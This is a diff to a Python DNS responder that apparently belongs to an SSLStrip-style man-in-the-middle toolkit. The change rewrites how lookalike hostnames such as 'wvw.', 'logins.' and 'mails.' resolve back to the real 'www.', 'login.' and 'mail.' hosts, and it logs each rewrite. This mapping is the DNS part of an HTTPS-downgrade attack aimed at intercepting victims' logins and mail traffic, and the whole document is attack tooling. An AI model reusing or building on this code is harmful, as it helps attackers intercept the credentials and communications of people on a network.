@@ -574,16 +574,17 @@ def std_A_qry(msg, prov_ip):
             punto = host.find(".")
             dominio = host[punto:]
             host2 = ''
-            if host[:5] == 'www2.' or host[:7] == 'secure.':
-                host2 = 'www%s' % dominio
-            elif host[:7] == 'login':
-                host2 = 'logins%s' % dominio
-            elif host[:5] == 'mail':
-                host2 = 'mails%s' % dominio
+            if host[:4] == 'wvw.':
+               	host2 = 'www.%s' % dominio
+            elif host[:7] == 'logins.':
+                host2 = 'login.%s' % dominio
+            elif host[:6] == 'mails.':
+                host2 = 'mail.%s' % dominio
          #   elif host == 'domain.com':  # Yes, It is ugly....
        #         host2 = 'test.domain.com'
             if host2 != '':
                 DEBUGLOG('SSLStrip transforming host: %s => %s ...' % (host, host2))
+                save_req(LOGREQFILE, 'SSLSTRIP host: %s => %s \n' % (host, host2))
                 ips = respuestas(host2, 'A')
 
         #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
